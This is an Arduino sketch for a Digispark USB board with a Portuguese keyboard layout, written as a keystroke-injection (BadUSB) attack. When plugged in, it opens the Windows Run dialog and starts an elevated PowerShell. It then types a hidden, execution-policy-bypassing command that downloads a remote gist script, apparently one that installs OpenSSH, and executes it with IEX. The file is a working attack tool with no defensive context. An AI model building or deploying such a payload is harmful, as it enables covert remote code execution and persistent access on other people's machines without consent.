#include "DigiKeyboardPtBr.h"
void setup() {
  pinMode(0,OUTPUT); //LED on model B
  pinMode(1,OUTPUT); //LED on model A    
}

void loop() {  
  pisca_led(100);
  DigiKeyboardPtBr.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.println('powershell start-process powershell -verb runas');
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardPtBr.delay(3000); 
  // Executando o script publicado no gist
  DigiKeyboardPtBr.print(F("powershell -W hidden -noni -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/SEU_USUARIO/Install-OpenSSH.ps1');\""));
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);  
  pisca_led(1000); 
  for(;;){ /*empty*/ }  
}

void pisca_led(int velocidade){  
  for (int inicio =1; inicio <= 10; inicio ++) {
    digitalWrite(0, HIGH); // LED on <--> Action start
    digitalWrite(1, HIGH); // LED on <--> Action start
    DigiKeyboardPtBr.delay(velocidade);  
    digitalWrite(0, LOW); // LED off <--> Action end
    digitalWrite(1, LOW); // LED off <--> Action end
    DigiKeyboardPtBr.delay(velocidade);  
  } 
}